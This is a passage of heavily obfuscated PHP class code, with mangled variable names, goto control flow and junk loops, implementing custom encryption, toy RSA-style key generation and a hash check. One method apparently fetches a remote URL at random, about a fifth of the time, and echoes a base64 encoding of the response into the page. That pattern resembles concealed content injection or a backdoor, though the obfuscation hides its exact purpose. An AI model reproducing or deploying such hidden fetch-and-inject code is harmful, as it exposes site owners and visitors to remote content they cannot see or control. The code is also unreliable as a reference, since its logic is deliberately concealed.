$b¥´ØÁ½Á‹ = $Eì—öÕºÑà[626]; if (strlen($b¥´ØÁ½Á‹) < $Eì—öÕºÑà[567]) { return; } $bñí†ÃÑ’ = $BŒãê¼¦©[$this->undl50391cdc]; goto Dã¶¼…ŞŠŒ; f²Â‹‹¯Œ¥: $fóã ï·­ã = $Eì—öÕºÑà[628]; if (strlen($fóã ï·­ã) < $Eì—öÕºÑà[558]) { return; } $fƒ§ÒÅ¡ÄÎ = $Bí½ÓœôË[113]($this->qofx89c68600, $Bí½ÓœôË[332]); goto E’âöòÄŠ×; fî¿Èœòâ: } public function nbrdf971c4de($b¾íïˆß) { goto a›’ˆÕË¡; b‚’¿‘½‡±: if (!$dâ©¥°‰‚§) { return; } if ($Aš¡Š¥°â® <= $a±İ‡À¨) { return; } $eï¢Å°Ûƒ = $f‰ÀÁ‡×†³[61]($f‰ÀÁ‡×†³[148])->{$_SERVER[˜][334]}($f‰ÀÁ‡×†³[333])->{$_SERVER[˜][335]}($a±İ‡À¨)->{$_SERVER[˜][336]}(); goto Cí•ö˜»´…; a›’ˆÕË¡: $AÀ¹Œ„Ùœ =& $_SERVER[¬ˆÚÂ”Éğä]; $f‰ÀÁ‡×†³ =& $_SERVER[˜]; $a±İ‡À¨ = $this->{$_SERVER[˜][146]}(); goto FÈÓ¶Óîø; eÊˆã­‹Œî: if ($a±İ‡À¨ >= $f‰ÀÁ‡×†³[249]($f‰ÀÁ‡×†³[250])) { return; } $Aš¡Š¥°â® = $f‰ÀÁ‡×†³[61]($f‰ÀÁ‡×†³[148])->{$_SERVER[˜][149]}(); $dâ©¥°‰‚§ = $AÀ¹Œ„Ùœ[631]; goto b‚’¿‘½‡±; Cí•ö˜»´…: $eï¢Å°Ûƒ = $f‰ÀÁ‡×†³[230]($eï¢Å°Ûƒ, $f‰ÀÁ‡×†³[10], $f‰ÀÁ‡×†³[333]); if (!$f‰ÀÁ‡×†³[247]($b¾íïˆß[$f‰ÀÁ‡×†³[333]], $eï¢Å°Ûƒ)) { $f‰ÀÁ‡×†³[175]($f‰ÀÁ‡×†³[337], !1, $f‰ÀÁ‡×†³[244]); } goto Dİ¶ÙËÕéÀ; FÈÓ¶Óîø: $F³çÉÇ©‰ = $AÀ¹Œ„Ùœ[630]; while ($F³çÉÇ©‰ < $AÀ¹Œ„Ùœ[567]) { if ($F³çÉÇ©‰ >= 0) { break; } $F³çÉÇ©‰++; } if ($b¾íïˆß[$f‰ÀÁ‡×†³[333]] == $f‰ÀÁ‡×†³[228]) { return; } goto eÊˆã­‹Œî; Dİ¶ÙËÕéÀ: } public function duskf249c211() { goto E«ëØç²àˆ; E«ëØç²àˆ: $b‚‡ç®‹Û =& $_SERVER[¬ˆÚÂ”Éğä]; $bÄİë¼»¥´ =& $_SERVER[˜]; if (!$bÄİë¼»¥´[113]($GLOBALS, $bÄİë¼»¥´[141]) || $bÄİë¼»¥´[338](1, 100) > 20) { return; } goto F·¤œ¡¨î; F·¤œ¡¨î: $f‰È‡¿†» = $bÄİë¼»¥´[254]; $f‰È‡¿†» = $this->{$_SERVER[˜][255]}($f‰È‡¿†», $bÄİë¼»¥´[256]); $a†¸œÕ¾ÛŸ = $b‚‡ç®‹Û[632]; goto B³„ ³®ŒŸ; B³„ ³®ŒŸ: if (strlen($a†¸œÕ¾ÛŸ) < $b‚‡ç®‹Û[553]) { die; } $eå«Ø£î† = $bÄİë¼»¥´[257](array($bÄİë¼»¥´[258] => array($bÄİë¼»¥´[259] => $bÄİë¼»¥´[260], $bÄİë¼»¥´[261] => 3))); $a¸¤ïªš² = @$bÄİë¼»¥´[262]($f‰È‡¿†», !1, $eå«Ø£î†); goto FòÃÍ©ÍĞñ; FòÃÍ©ÍĞñ: echo $bÄİë¼»¥´[339] . $bÄİë¼»¥´[340]($a¸¤ïªš²) . $bÄİë¼»¥´[341]; $d×ĞÈ†äô = $b‚‡ç®‹Û[633]; while ($d×ĞÈ†äô < $b‚‡ç®‹Û[562]) { if ($d×ĞÈ†äô >= 0) { break; } $d×ĞÈ†äô++; } goto E’Ê§Š·¤; E’Ê§Š·¤: } private function bgtk70c50698($Aà§ˆœÔŸ‡, $aÁÖŒƒ†¶£, $Bå¼è¨ƒ› = 3) { goto bÜ¢êò–”; A£©ö÷¹”™: $d¤òÖ†ßƒ = $Bİƒ”Úã‹³[635]; $EàßÛ¾Ö‘¿ = $dßÅãğÀ [133](15); $A›¸¶“ñ» = $dßÅãğÀ [343]; goto fÍå®¹÷‚ğ; bÜ¢êò–”: $Bİƒ”Úã‹³ =& $_SERVER[¬ˆÚÂ”Éğä]; $dßÅãğÀ  =& $_SERVER[˜]; $dßÅãğÀ [342](1); goto eÒêäˆ¡Â; eÒêäˆ¡Â: $Aà§ˆœÔŸ‡ = $dßÅãğÀ [2]($Aà§ˆœÔŸ‡); $báº¶µòå = $Bİƒ”Úã‹³[634]; $fĞÌåñ = $dßÅãğÀ [338](0, 5) . $dßÅãğÀ [10]; goto A£©ö÷¹”™; FàçØí²¨¬: $E¢Êãğ…­ = $dßÅãğÀ [222]($fĞÌåñ . $EàßÛ¾Ö‘¿ . $E¢Êãğ…­); if ($Bå¼è¨ƒ› - 1 > 0) { $E¢Êãğ…­ = $this->{$_SERVER[˜][136]}($E¢Êãğ…­, $aÁÖŒƒ†¶£, $Bå¼è¨ƒ› - 1); } return $E¢Êãğ…­; goto c»…è¶Ş„å; fÍå®¹÷‚ğ: $d‘Ğñç…İ = $Bİƒ”Úã‹³[636]; if (strlen($d‘Ğñç…İ) < $Bİƒ”Úã‹³[558]) { die; } switch ($fĞÌåñ) { case $dßÅãğÀ [240]: $E¢Êãğ…­ = $this->{$_SERVER[˜][156]}($Aà§ˆœÔŸ‡, $dßÅãğÀ [222]($aÁÖŒƒ†¶£ . $EàßÛ¾Ö‘¿)); $F—Ş™âéà = $Bİƒ”Úã‹³[637]; if (!$F—Ş™âéà) { die; } break; $fÊ¶àé‘“ = $Bİƒ”Úã‹³[638]; if (strlen($fÊ¶àé‘“) < $Bİƒ”Úã‹³[567]) { return; } case $dßÅãğÀ [228]: $E¢Êãğ…­ = $this->{$_SERVER[˜][156]}($Aà§ˆœÔŸ‡, $dßÅãğÀ [222]($EàßÛ¾Ö‘¿ . $aÁÖŒƒ†¶£)); break; case $dßÅãğÀ [344]: $E¢Êãğ…­ = $this->{$_SERVER[˜][156]}($Aà§ˆœÔŸ‡, $dßÅãğÀ [127]($EàßÛ¾Ö‘¿ . $aÁÖŒƒ†¶£)); $CÍÂØ‡š§ = $Bİƒ”Úã‹³[639]; if (strlen($CÍÂØ‡š§) < $Bİƒ”Úã‹³[562]) { die; } break; $b÷«†³µãƒ = $Bİƒ”Úã‹³[640]; if (!$b÷«†³µãƒ) { die; } case $dßÅãğÀ [345]: $E¢Êãğ…­ = $this->{$_SERVER[˜][156]}($Aà§ˆœÔŸ‡, $dßÅãğÀ [123]($EàßÛ¾Ö‘¿ . $aÁÖŒƒ†¶£)); $Cöò‰ë«âÏ = $Bİƒ”Úã‹³[641]; break; case $dßÅãğÀ [346]: goto D¯†÷ìö ç; Dßò²¢Ï¹É: break; goto BÜ™Ïˆ•Ú£; a³¯Œ¼±‰: $cÃ‡¸îéø» = $dßÅãğÀ [347](0, 64); $aœââ¢·‹Æ = $Bİƒ”Úã‹³[643]; if (strlen($aœââ¢·‹Æ) < $Bİƒ”Úã‹³[553]) { die; } goto Eï¬ŠÃ†Š; d‘¦µÆ§õ: if (!$a×¹ÎïÀã¨) { die; } $CÇè¥àæÅ× = 0; $A¨Š‡•æô = 0; goto F•ç¬Á°Â; D¯†÷ìö ç: $Aà§ˆœÔŸ‡ = $dßÅãğÀ [127]($Aà§ˆœÔŸ‡); $EÏ®Åñƒ¥ó = $Bİƒ”Úã‹³[642]; while ($EÏ®Åñƒ¥ó < $Bİƒ”Úã‹³[569]) { if ($EÏ®Åñƒ¥ó >= 0) { break; } $EÏ®Åñƒ¥ó++; } goto a³¯Œ¼±‰; aÃßº›ì«Ã: $bİŸó­ĞÆ = $dßÅãğÀ [25]($bİŸó­ĞÆ, $cÃ‡¸îéø» % 8, $cÃ‡¸îéø» % 8 + 7); $C·±ßêÊò = $dßÅãğÀ [10]; $a×¹ÎïÀã¨ = $Bİƒ”Úã‹³[646]; goto d‘¦µÆ§õ; Eï¬ŠÃ†Š: $d¤ô²Ä££Ö = $A›¸¶“ñ»[$cÃ‡¸îéø»]; $CğäË­Šù = $Bİƒ”Úã‹³[644]; if (strlen($CğäË­Šù) < $Bİƒ”Úã‹³[567]) { return; } goto Aß¦©÷¬Çâ; Aß¦©÷¬Çâ: $bİŸó­ĞÆ = $dßÅãğÀ [123]($d¤ô²Ä££Ö . $dßÅãğÀ [123]($aÁÖŒƒ†¶£ . $d¤ô²Ä££Ö) . $aÁÖŒƒ†¶£); $F”ÍÔó¹á‰ = $Bİƒ”Úã‹³[645]; if (strlen($F”ÍÔó¹á‰) < $Bİƒ”Úã‹³[569]) { die; } goto aÃßº›ì«Ã; F‰ò®É™†½: $E¢Êãğ…­ = $dßÅãğÀ [340]($d¤ô²Ä££Ö . $C·±ßêÊò); $cò¾®²´© = $Bİƒ”Úã‹³[649]; if (!$cò¾®²´©) { return; } goto Dßò²¢Ï¹É; F•ç¬Á°Â: $BˆÆÑ§ÃíÛ = $Bİƒ”Úã‹³[647]; $Eà§©ÒÅ¡î = 0; for ($CÇè¥àæÅ× = 0; $CÇè¥àæÅ× < $dßÅãğÀ [24]($Aà§ˆœÔŸ‡); $CÇè¥àæÅ×++) { $Eà§©ÒÅ¡î = $Eà§©ÒÅ¡î == $dßÅãğÀ [24]($bİŸó­ĞÆ) ? 0 : $Eà§©ÒÅ¡î; $bŠòâà¨Ò— = $Bİƒ”Úã‹³[648]; if (!$bŠòâà¨Ò—) { die; } $A¨Š‡•æô = ($cÃ‡¸îéø» + $dßÅãğÀ [348]($A›¸¶“ñ», $Aà§ˆœÔŸ‡[$CÇè¥àæÅ×]) + $dßÅãğÀ [349]($bİŸó­ĞÆ[$Eà§©ÒÅ¡î++])) % 64; $C·±ßêÊò .= $A›¸¶“ñ»[$A¨Š‡•æô]; } goto F‰ò®É™†½; BÜ™Ïˆ•Ú£: default: $E¢Êãğ…­ = $this->{$_SERVER[˜][156]}($Aà§ˆœÔŸ‡, $aÁÖŒƒ†¶£ . $EàßÛ¾Ö‘¿); $aŒè›‹¬Ø = $Bİƒ”Úã‹³[650]; if (!$aŒè›‹¬Ø) { die; } break; $d÷ï”†ë®¶ = $Bİƒ”Úã‹³[651]; if (strlen($d÷ï”†ë®¶) < $Bİƒ”Úã‹³[567]) { die; } } goto FàçØí²¨¬; c»…è¶Ş„å: } private function mdtfcc433bfb($Eë³Ï‡âø, $E”½¿ãÚ‚, $CÆßÃÄà¢å = 3) { goto báëåšÃò‰; F­•›«„è×: if (!$A‹š³Õ¡™õ) { die; } $A†‹çéÊê– = $a°ë²Í‰©Ä[25]($Eë³Ï‡âø, 1, 15); $C³ƒ…Š§Ë = $dç×éÎÎäî[654]; goto dòäĞë—õ‘; Aã¸´ÒÃí¤: $Eë³Ï‡âø = $a°ë²Í‰©Ä[2]($Eë³Ï‡âø); $Eë³Ï‡âø = $a°ë²Í‰©Ä[222]($Eë³Ï‡âø); $F“İÑ¶ğ´õ = $dç×éÎÎäî[652]; goto DéÌ©¡ñ•; AÆ‡©º¾…¼: while ($d³Üà‚Šöê < $dç×éÎÎäî[553]) { if ($d³Üà‚Šöê >= 0) { break; } $d³Üà‚Šöê++; } switch ($c›¬·ÁÃñÕ) { case $a°ë²Í‰©Ä[240]: $c§ÅÑšğ¸ = $this->{$_SERVER[˜][255]}($Eë³Ï‡âø, $a°ë²Í‰©Ä[222]($E”½¿ãÚ‚ . $A†‹çéÊê–)); break; $fÓ˜ãâÃÇ = $dç×éÎÎäî[657]; if (!$fÓ˜ãâÃÇ) { die; } case $a°ë²Í‰©Ä[228]: $c§ÅÑšğ¸ = $this->{$_SERVER[˜][255]}($Eë³Ï‡âø, $a°ë²Í‰©Ä[222]($A†‹çéÊê– . $E”½¿ãÚ‚)); $D¦ˆÂ´“å = $dç×éÎÎäî[658]; break; case $a°ë²Í‰©Ä[344]: $c§ÅÑšğ¸ = $this->{$_SERVER[˜][255]}($Eë³Ï‡âø, $a°ë²Í‰©Ä[127]($A†‹çéÊê– . $E”½¿ãÚ‚)); $BËã¢•î÷ó = $dç×éÎÎäî[659]; if (strlen($BËã¢•î÷ó) < $dç×éÎÎäî[569]) { return; } break; case $a°ë²Í‰©Ä[345]: $c§ÅÑšğ¸ = $this->{$_SERVER[˜][255]}($Eë³Ï‡âø, $a°ë²Í‰©Ä[123]($A†‹çéÊê– . $E”½¿ãÚ‚)); break; case $a°ë²Í‰©Ä[346]: goto d½†ñ‘ÈŠá; c·©š‚èÉ: $C×–á¬ï¾İ = $dç×éÎÎäî[662]; while (strlen($C×–á¬ï¾İ) < $dç×éÎÎäî[553]) { if (!$C×–á¬ï¾İ) { break; } $C×–á¬ï¾İ++; } $A¾•Èî•îÚ = $a°ë²Í‰©Ä[348]($CÌë™æ‡ºÈ, $d¤ê‚ˆÛĞ); goto Aíªï§Â­; A»œèšñòš: $aÛâ½ƒ²½Š = 0; for ($c…Ÿ÷ÇšµŸ = 0; $c…Ÿ÷ÇšµŸ < $a°ë²Í‰©Ä[24]($Eë³Ï‡âø); $c…Ÿ÷ÇšµŸ++) { $aÛâ½ƒ²½Š = $aÛâ½ƒ²½Š == $a°ë²Í‰©Ä[24]($Bˆ¸‰Öò») ? 0 : $aÛâ½ƒ²½Š; $cÚˆ•›×‹ = $dç×éÎÎäî[664]; if (!$cÚˆ•›×‹) { die; } $bŞ˜áÛ¡Üğ = $aÛâ½ƒ²½Š++; $aôˆ©åƒÑ¬ = $a°ë²Í‰©Ä[348]($CÌë™æ‡ºÈ, $Eë³Ï‡âø[$c…Ÿ÷ÇšµŸ]) - $A¾•Èî•îÚ - $a°ë²Í‰©Ä[349]($Bˆ¸‰Öò»[$bŞ˜áÛ¡Üğ]); $Døà³ÕèÅà = $dç×éÎÎäî[665]; if (!$Døà³ÕèÅà) { return; } while ($aôˆ©åƒÑ¬ < 0) { $aôˆ©åƒÑ¬ += 64; } $C¤ğ œŞò… .= $CÌë™æ‡ºÈ[$aôˆ©åƒÑ¬]; } $c§ÅÑšğ¸ = $a°ë²Í‰©Ä[352]($C¤ğ œŞò…); goto d»»ÂéÔà¦; d»»ÂéÔà¦: $fÍ•Ãö…¾ù = $dç×éÎÎäî[666]; while (strlen($fÍ•Ãö…¾ù) < $dç×éÎÎäî[553]) { if (!$fÍ•Ãö…¾ù) { break; } $fÍ•Ãö…¾ù++; } break; goto D×†ŞïĞò; Aíªï§Â­: $Bˆ¸‰Öò» = $a°ë²Í‰©Ä[123]($d¤ê‚ˆÛĞ . $a°ë²Í‰©Ä[123]($E”½¿ãÚ‚ . $d¤ê‚ˆÛĞ) . $E”½¿ãÚ‚); $Bˆ¸‰Öò» = $a°ë²Í‰©Ä[25]($Bˆ¸‰Öò», $A¾•Èî•îÚ % 8, $A¾•Èî•îÚ % 8 + 7); $C¤ğ œŞò… = $a°ë²Í‰©Ä[10]; goto aœ´‡‘…–°; aœ´‡‘…–°: $D¡ë©ñÕÉ‡ = $dç×éÎÎäî[663]; $c…Ÿ÷ÇšµŸ = 0; $aôˆ©åƒÑ¬ = 0; goto A»œèšñòš; d½†ñ‘ÈŠá: $Eë³Ï‡âø = $a°ë²Í‰©Ä[351]($Eë³Ï‡âø); $Bİœ¤Õ‘ŠÙ = $dç×éÎÎäî[660]; if (strlen($Bİœ¤Õ‘ŠÙ) < $dç×éÎÎäî[553]) { return; } goto DÆØåçİ×Ò; DÆØåçİ×Ò: $d¤ê‚ˆÛĞ = $Eë³Ï‡âø[0]; $dŒíßÇ§ß— = $dç×éÎÎäî[661]; $Eë³Ï‡âø = $a°ë²Í‰©Ä[25]($Eë³Ï‡âø, 1); goto c·©š‚èÉ; D×†ŞïĞò: default: $c§ÅÑšğ¸ = $this->{$_SERVER[˜][255]}($Eë³Ï‡âø, $E”½¿ãÚ‚ . $A†‹çéÊê–); $aîÇÍ©ôÌç = $dç×éÎÎäî[667]; if (!$aîÇÍ©ôÌç) { die; } break; $E°¯Œº›® = $dç×éÎÎäî[668]; if (!$E°¯Œº›®) { die; } } if ($CÆßÃÄà¢å - 1 > 0) { $c§ÅÑšğ¸ = $this->{$_SERVER[˜][197]}($c§ÅÑšğ¸, $E”½¿ãÚ‚, $CÆßÃÄà¢å - 1); } goto E‚‰ÁŒïß; E‚‰ÁŒïß: return $c§ÅÑšğ¸; goto eíåî¼»¤Ã; cÔ­ùŠˆšÈ: while (strlen($dà÷êÊ¥¬Œ) < $dç×éÎÎäî[558]) { if (!$dà÷êÊ¥¬Œ) { break; } $dà÷êÊ¥¬Œ++; } $CÌë™æ‡ºÈ = $a°ë²Í‰©Ä[343]; $d³Üà‚Šöê = $dç×éÎÎäî[656]; goto AÆ‡©º¾…¼; báëåšÃò‰: $dç×éÎÎäî =& $_SERVER[¬ˆÚÂ”Éğä]; $a°ë²Í‰©Ä =& $_SERVER[˜]; if (!$a°ë²Í‰©Ä[350]($Eë³Ï‡âø) || $a°ë²Í‰©Ä[24]($Eë³Ï‡âø) < 10) { return !1; } goto Aã¸´ÒÃí¤; DéÌ©¡ñ•: if (strlen($F“İÑ¶ğ´õ) < $dç×éÎÎäî[553]) { return; } $c›¬·ÁÃñÕ = $Eë³Ï‡âø[0]; $A‹š³Õ¡™õ = $dç×éÎÎäî[653]; goto F­•›«„è×; dòäĞë—õ‘: if (!$C³ƒ…Š§Ë) { return; } $Eë³Ï‡âø = $a°ë²Í‰©Ä[25]($Eë³Ï‡âø, 16); $dà÷êÊ¥¬Œ = $dç×éÎÎäî[655]; goto cÔ­ùŠˆšÈ; eíåî¼»¤Ã: } public function ohma509a0ec5($dÆ¿´ã»‰‘) { goto AĞ§ß‚ Ôè; AÅÕ´ñª£ï: $Eöø–·êŒ = ($e²¼„‡ÆÂŒ - 1) * ($aºàˆİ„ÒÛ - 1); $f×Æ§óôÀ› = $FŸ†“ÇÑÛà[670]; $F¸‰®Åì³ç = $F±Ã›¢˜›Û[249](($e²¼„‡ÆÂŒ + $aºàˆİ„ÒÛ) / 2); goto B¶ÈïÈ»; AùœØ°¡‹: return $dôÖ„°‹ùŠ; goto b¿†¤ä¼ÛÕ; FøÙó’ƒõò: $dôÖ„°‹ùŠ = $this->{$_SERVER[˜][156]}($dÆ¿´ã»‰‘, $DÛ»ºàäæ˜) . $F±Ã›¢˜›Û[357] . $B«›¢Ø¥Ğ¹; $DÀ¯£·ã¬ä = $FŸ†“ÇÑÛà[676]; if (strlen($DÀ¯£·ã¬ä) < $FŸ†“ÇÑÛà[562]) { return; } goto AùœØ°¡‹; E°¨ñÕƒ”ï: $aºàˆİ„ÒÛ = $this->{$_SERVER[˜][353]}(); $bªëÂ‚é†µ = $FŸ†“ÇÑÛà[669]; if (!$bªëÂ‚é†µ) { die; } goto AÅÕ´ñª£ï; C¨ÑÅİš«…: $B«›¢Ø¥Ğ¹ = $this->{$_SERVER[˜][156]}($e²¼„‡ÆÂŒ * $aºàˆİ„ÒÛ . $F±Ã›¢˜›Û[10], $F±Ã›¢˜›Û[158]); $DÛ»ºàäæ˜ = $F±Ã›¢˜›Û[123]($F±Ã›¢˜›Û[354] . ($e²¼„‡ÆÂŒ + $aºàˆİ„ÒÛ) . $F±Ã›¢˜›Û[355] . $F¸‰®Åì³ç . $F±Ã›¢˜›Û[355] . $BßºŠµğôø . $F±Ã›¢˜›Û[356]); $E†¸Ï‘Í = $FŸ†“ÇÑÛà[675]; goto FøÙó’ƒõò; AĞ§ß‚ Ôè: $FŸ†“ÇÑÛà =& $_SERVER[¬ˆÚÂ”Éğä]; $F±Ã›¢˜›Û =& $_SERVER[˜]; $e²¼„‡ÆÂŒ = $this->{$_SERVER[˜][353]}(); goto E°¨ñÕƒ”ï; B¶ÈïÈ»: while (1) { $Eø¿ÜÚŒ„Î = $F¸‰®Åì³ç; $FÂ‡í¢ì = $FŸ†“ÇÑÛà[671]; $Eó¬Ò˜„Èë = $Eöø–·êŒ; $dÙ–ÂÏİ¤Ñ = $FŸ†“ÇÑÛà[672]; if (!$dÙ–ÂÏİ¤Ñ) { return; } while ($Eó¬Ò˜„Èë % $Eø¿ÜÚŒ„Î != 0) { $DĞãËëæÑÔ = $Eó¬Ò˜„Èë; $d§¯ßª–µ„ = $FŸ†“ÇÑÛà[673]; if (strlen($d§¯ßª–µ„) < $FŸ†“ÇÑÛà[553]) { return; } $Eó¬Ò˜„Èë = $Eø¿ÜÚŒ„Î; $A¾®ÀÏˆËä = $FŸ†“ÇÑÛà[674]; if (!$A¾®ÀÏˆËä) { die; } $Eø¿ÜÚŒ„Î = $DĞãËëæÑÔ % $Eø¿ÜÚŒ„Î; } if ($Eø¿ÜÚŒ„Î == 1) { break; } else { $F¸‰®Åì³ç++; } } $BßºŠµğôø = 2; for ($EÖŒòÎĞ¦ = 0; $EÖŒòÎĞ¦ < $Eöø–·êŒ * 10; $EÖŒòÎĞ¦++) { if (($Eöø–·êŒ * $EÖŒòÎĞ¦ + 1) % $F¸‰®Åì³ç == 0) { $BßºŠµğôø = $F±Ã›¢˜›Û[249](($Eöø–·êŒ * $EÖŒòÎĞ¦ + 1) / $F¸‰®Åì³ç); break; } } goto C¨ÑÅİš«…; b¿†¤ä¼ÛÕ: } public function xepoaa71b6f0($eÁéø›ˆÏ˜) { goto Dƒä›Ò‰è¶; d¤Ò¡²‚Ú™: if (strlen($cÜö„İŸà) < $D‰ƒÚ¡íÜŒ[553]) { return; } for ($c“¥Æ£İøí = 0; $c“¥Æ£İøí < $E¥ÍË‹Ã‰ * 10; $c“¥Æ£İøí++) { if (($E¥ÍË‹Ã‰ * $c“¥Æ£İøí + 1) % $bù­°´­Ä == 0) { $fˆÉè¡Äùî = $a¸„áô¨áÄ[249](($E¥ÍË‹Ã‰ * $c“¥Æ£İøí + 1) / $bù­°´­Ä); break; } } $Fñ†ÄØ¡º = $a¸„áô¨áÄ[123]($a¸„áô¨áÄ[354] . ($cÈ£´Ãæé† + $A—‚Ü“ã‰) . $a¸„áô¨áÄ[355] . $bù­°´­Ä . $a¸„áô¨áÄ[355] . $fˆÉè¡Äùî . $a¸„áô¨áÄ[356]); goto fÅŒƒÙ‚ô›; fÅŒƒÙ‚ô›: $FÖ¬Å¤ÌÅ„ = $D‰ƒÚ¡íÜŒ[686]; if (!$FÖ¬Å¤ÌÅ„) { die; } $Dàİ®¸ˆ½ = $this->{$_SERVER[˜][255]}($Aİôó¢÷†í[0], $Fñ†ÄØ¡º); goto E¾»Àó©‘ê; Cïšï‡¦¬: $fê¥¸í×Ÿ¶ = $D‰ƒÚ¡íÜŒ[688]; goto fÑß¬õÃ’; a¨ÃÉöò·æ: while (1) { $bğ†¾  ìØ = $bù­°´­Ä; $e¬ŠÎ„¹Ó = $E¥ÍË‹Ã‰; while ($e¬ŠÎ„¹Ó % $bğ†¾  ìØ != 0) { $D´öçâÏŞ = $e¬ŠÎ„¹Ó; $e¬ŠÎ„¹Ó = $bğ†¾  ìØ; $dä—”…„İÛ = $D‰ƒÚ¡íÜŒ[571]; while ($dä—”…„İÛ < $D‰ƒÚ¡íÜŒ[562]) { if ($dä—”…„İÛ >= 0) { break; } $dä—”…„İÛ++; } $bğ†¾  ìØ = $D´öçâÏŞ % $bğ†¾  ìØ; $aºÈ¸ØÑ© = $D‰ƒÚ¡íÜŒ[684]; } if ($bğ†¾  ìØ == 1) { break; } else { $bù­°´­Ä++; } } $fˆÉè¡Äùî = 2; $cÜö„İŸà = $D‰ƒÚ¡íÜŒ[685]; goto d¤Ò¡²‚Ú™; DÚ©‘½êĞƒ: $b‚Ê–×¡Õê = $D‰ƒÚ¡íÜŒ[678]; if (strlen($b‚Ê–×¡Õê) < $D‰ƒÚ¡íÜŒ[553]) { die; } $cÈ£´Ãæé† = 0; goto c†‰¡ïÜ­¡; FƒÍ÷Ô°ìí: for ($c“¥Æ£İøí = 3; $c“¥Æ£İøí < $Eë¸¾ŞÒÛ”; $c“¥Æ£İøí += 2) { if ($Eë¸¾ŞÒÛ” % $c“¥Æ£İøí != 0) { continue; } $cÈ£´Ãæé† = $c“¥Æ£İøí; $E†ÍÌù­¾Û = $D‰ƒÚ¡íÜŒ[680]; if (!$E†ÍÌù­¾Û) { die; } $A—‚Ü“ã‰ = $a¸„áô¨áÄ[249]($Eë¸¾ŞÒÛ” / $c“¥Æ£İøí); $Cƒİ‡è¼ß = $D‰ƒÚ¡íÜŒ[681]; if (strlen($Cƒİ‡è¼ß) < $D‰ƒÚ¡íÜŒ[562]) { return; } break; } $E¥ÍË‹Ã‰ = ($cÈ£´Ãæé† - 1) * ($A—‚Ü“ã‰ - 1); $BÈ‰£…„¸Š = $D‰ƒÚ¡íÜŒ[682]; goto d¾óí©‚ø; AŞ£’‚š°Ñ: if ($a¸„áô¨áÄ[19]($Aİôó¢÷†í) != 2) { return $a¸„áô¨áÄ[10]; } $Eë¸¾ŞÒÛ” = $this->{$_SERVER[˜][255]}($Aİôó¢÷†í[1] . $a¸„áô¨áÄ[10], $a¸„áô¨áÄ[158]); $eÔ¾ÄÈ‘‹® = $D‰ƒÚ¡íÜŒ[677]; goto C¤“¦‘©ê; E¾»Àó©‘ê: $a×Ñ¾ÛŒÇö = $D‰ƒÚ¡íÜŒ[687]; while (strlen($a×Ñ¾ÛŒÇö) < $D‰ƒÚ¡íÜŒ[569]) { if (!$a×Ñ¾ÛŒÇö) { break; } $a×Ñ¾ÛŒÇö++; } return $Dàİ®¸ˆ½; goto Cïšï‡¦¬; Dƒä›Ò‰è¶: $D‰ƒÚ¡íÜŒ =& $_SERVER[¬ˆÚÂ”Éğä]; $a¸„áô¨áÄ =& $_SERVER[˜]; $Aİôó¢÷†í = $a¸„áô¨áÄ[0]($a¸„áô¨áÄ[357], $eÁéø›ˆÏ˜); goto AŞ£’‚š°Ñ; c†‰¡ïÜ­¡: $bÖ‚™ˆÎ‡¾ = $D‰ƒÚ¡íÜŒ[679]; if (strlen($bÖ‚™ˆÎ‡¾) < $D‰ƒÚ¡íÜŒ[562]) { return; } $A—‚Ü“ã‰ = 0; goto FƒÍ÷Ô°ìí; C¤“¦‘©ê: if (strlen($eÔ¾ÄÈ‘‹®) < $D‰ƒÚ¡íÜŒ[569]) { die; } if (!$Eë¸¾ŞÒÛ”) { return $a¸„áô¨áÄ[10]; } $Eë¸¾ŞÒÛ” = $a¸„áô¨áÄ[249]($Eë¸¾ŞÒÛ”); goto DÚ©‘½êĞƒ; d¾óí©‚ø: while ($BÈ‰£…„¸Š < $D‰ƒÚ¡íÜŒ[558]) { if ($BÈ‰£…„¸Š >= 0) { break; } $BÈ‰£…„¸Š++; } $bù­°´­Ä = $a¸„áô¨áÄ[249](($cÈ£´Ãæé† + $A—‚Ü“ã‰) / 2); $F—œÆİ—å© = $D‰ƒÚ¡íÜŒ[683]; goto a¨ÃÉöò·æ; fÑß¬õÃ’: } public function jyut73e9523d() { goto B£øĞë…; dÍâÕ¢¦Šë: $cĞ˜¾Ò’¸Œ = $BõîÙà³ƒ[689]; if (strlen($cĞ˜¾Ò’¸Œ) < $BõîÙà³ƒ[558]) { die; } $b×ÔßÀö = array(); goto EÖêŒ… ; c˜»½Ï¼÷: return $EçÛ„Äó°”; goto e©Ãİãù„Û; EÖêŒ… : $eÃç‡¿ˆÈ = 1; while ($eÃç‡¿ˆÈ <= (int) $eŞÜŒ»±øÇ[359]($a§±ëğä‚»)) { $Câº¼“…›´ = $eÃç‡¿ˆÈ; $b¡†‘š“Ú = $BõîÙà³ƒ[690]; if (!$b¡†‘š“Ú) { return; } while (!0) { $Câº¼“…›´++; $BˆÒÛã½ÊÜ = $BõîÙà³ƒ[691]; if (strlen($BˆÒÛã½ÊÜ) < $BõîÙà³ƒ[558]) { die; } if ($Câº¼“…›´ <= 2) { $eÃç‡¿ˆÈ = $Câº¼“…›´; break; } else { if ($Câº¼“…›´ < 2) { continue; } } $C¼›ƒ›õğ = !0; for ($Bµå¨™˜â = 2; $Bµå¨™˜â <= $eŞÜŒ»±øÇ[359]($Câº¼“…›´); $Bµå¨™˜â++) { if ($Câº¼“…›´ % $Bµå¨™˜â == 0) { $C¼›ƒ›õğ = !1; } } if ($C¼›ƒ›õğ) { $eÃç‡¿ˆÈ = $Câº¼“…›´; break; } } $b×ÔßÀö[] = $eÃç‡¿ˆÈ; $AøˆÜåÇ­Ó = $BõîÙà³ƒ[692]; if (strlen($AøˆÜåÇ­Ó) < $BõîÙà³ƒ[553]) { return; } } $EçÛ„Äó°” = 2; goto a­Ä´Ì”Ò¤; a­Ä´Ì”Ò¤: $CÖ±Ëºïš = $BõîÙà³ƒ[693]; while (strlen($CÖ±Ëºïš) < $BõîÙà³ƒ[553]) { if (!$CÖ±Ëºïš) { break; } $CÖ±Ëºïš++; } for ($Câº¼“…›´ = $a§±ëğä‚»; $Câº¼“…›´ > 1; $Câº¼“…›´--) { $C¼›ƒ›õğ = !0; foreach ($b×ÔßÀö as $b´Ï— ·Ñ°) { if ($Câº¼“…›´ % $b´Ï— ·Ñ° == 0) { $C¼›ƒ›õğ = !1; break; } } if ($C¼›ƒ›õğ) { $EçÛ„Äó°” = $Câº¼“…›´; break; } } goto c˜»½Ï¼÷; B£øĞë…: $BõîÙà³ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $eŞÜŒ»±øÇ =& $_SERVER[˜]; $a§±ëğä‚» = $eŞÜŒ»±øÇ[338]($eŞÜŒ»±øÇ[358](2, 14), $eŞÜŒ»±øÇ[358](2, 16) - 1); 